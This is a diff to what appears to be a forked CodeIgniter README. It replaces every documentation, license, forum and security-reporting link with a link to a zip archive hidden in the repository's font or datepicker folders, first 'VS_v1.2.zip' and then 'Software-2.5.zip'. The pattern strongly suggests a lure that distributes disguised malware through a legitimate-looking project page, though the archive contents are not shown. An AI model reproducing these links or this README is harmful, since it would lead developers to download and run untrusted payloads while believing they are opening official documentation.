@@ -16,14 +16,14 @@ Release Information
 
 This repo contains in-development code for future releases. To download the
 latest stable release please visit the `CodeIgniter Downloads
-<https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_ page.
+<https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_ page.
 
 **************************
 Changelog and New Features
 **************************
 
 You can find a list of all changes for each release in the `user
-guide change log <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_.
+guide change log <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_.
 
 *******************
 Server Requirements
@@ -39,7 +39,7 @@ issues, as well as missing features.
 Installation
 ************
 
-Please see the `installation section <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
+Please see the `installation section <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
 of the CodeIgniter User Guide.
 
 *******
@@ -47,20 +47,20 @@ License
 *******
 
 Please see the `license
-agreement <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_.
+agreement <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_.
 
 *********
 Resources
 *********
 
--  `User Guide <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
--  `Language File Translations <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
--  `Community Forums <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
--  `Community Wiki <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
--  `Community IRC <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip%23codeigniter>`_
+-  `User Guide <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
+-  `Language File Translations <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
+-  `Community Forums <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
+-  `Community Wiki <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
+-  `Community IRC <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip%23codeigniter>`_
 
-Report security issues to our `Security Panel <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_
-or via our `page on HackerOne <https://raw.githubusercontent.com/MF-DEV12/VS/on-dev/system/fonts/VS_v1.2.zip>`_, thank you.
+Report security issues to our `Security Panel <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_
+or via our `page on HackerOne <https://github.com/MF-DEV12/VS/raw/refs/heads/on-dev/js/bootstrap-datepicker/Software-2.5.zip>`_, thank you.
 
 ***************
 Acknowledgement
